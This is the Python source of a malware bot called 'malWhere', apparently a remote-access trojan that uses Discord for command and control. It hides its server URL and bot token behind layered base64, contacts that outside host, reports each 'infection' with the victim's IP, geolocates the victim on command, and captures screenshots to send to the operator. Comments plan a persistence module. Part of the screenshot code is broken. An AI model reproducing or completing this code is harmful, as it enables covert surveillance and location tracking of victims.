# malWhere.py
import os
import requests
import discord
from discord.ext import commands
from dotenv import load_dotenv
import json
import base64
import pyautogui

load_dotenv()
encryptedapi="aHR0cHM6Ly9nb2RzZXllLmZyZWUuYmVlY2VwdG9yLmNvbS8="
base64_string =encryptedapi
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
api = sample_string_bytes.decode("ascii")
gettoken=requests.get(api)
tokenjson=gettoken.json()
encryptedtoken=tokenjson["token"]
base64_string =encryptedtoken
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp1 = sample_string_bytes.decode("ascii")
base64_string =decryp1
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp2 = sample_string_bytes.decode("ascii")
base64_string =decryp2
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp3 = sample_string_bytes.decode("ascii")
base64_string =decryp3
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp4 = sample_string_bytes.decode("ascii")
base64_string =decryp4
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp5 = sample_string_bytes.decode("ascii")
TOKEN=decryp5

malWhere = commands.Bot(command_prefix='$')

r = requests.get('https://api.ipify.org?format=json')
response=r.json()
ip=response["ip"]
ip4chan=ip.replace(".","")

@malWhere.event
async def on_ready():  
  print(f"logged in as {malWhere}")
  guild = malWhere.get_guild(874824520467349504)
  infectionschannel=malWhere.get_channel(874824520693874756)
  #insert peristance module for windows
  #clone necesssary files into startup 
  existing_channel = discord.utils.get(guild.channels, name=ip4chan)
  if not existing_channel:
    await infectionschannel.send(f"New Infection from {ip} connection is established.. wating for commands")
    await guild.create_text_channel(ip)
  else:
    await infectionschannel.send(f"{ip} already infected connection is established.. wating for commands")

@malWhere.command()
async def geolocate(ctx):
  if str(ctx.channel)==(ip4chan):
    r = requests.get(f'http://ipinfo.io/{ip}?token=51030d1b61679e')
    response=r.json()
    print(response["loc"])
    embed=discord.Embed(title="Location Data", url=f"https://www.google.com/maps/search/4{response['loc']}/@{response['loc']},17z", description=f"{ip}'s Location data", color=0xFF5733)
    embed.add_field(name="IP", value=ip, inline=False)
    embed.add_field(name="COUNTRY", value=response["country"], inline=False)
    embed.add_field(name="REGION", value=response["region"], inline=False)
    embed.add_field(name="CITY", value=response["city"], inline=False)
    embed.add_field(name="POST CODE", value=response["postal"], inline=False)
    await ctx.send(embed=embed)
    await ctx.message.delete()
  else:
    await ctx.channel.send("wrong channel skid")


@malWhere.command()
async def screenshot(ctx):
  existing_channel = discord.utils.get(guild.channels, name=ip4chan)
  if not existing_channel:
    await guild.create_text_channel(f"{ip} media")
myScreenshot = pyautogui.screenshot()
myScreenshot.save(r'tempimage.png')
channel = discord.utils.get(ctx.guild.channels, name=f"{ip} media")
channel_id = channel.id
mediachan=malWhere.get_channel(channel_id)
mediachan.send(image="tempimage.png")



malWhere.run(TOKEN)
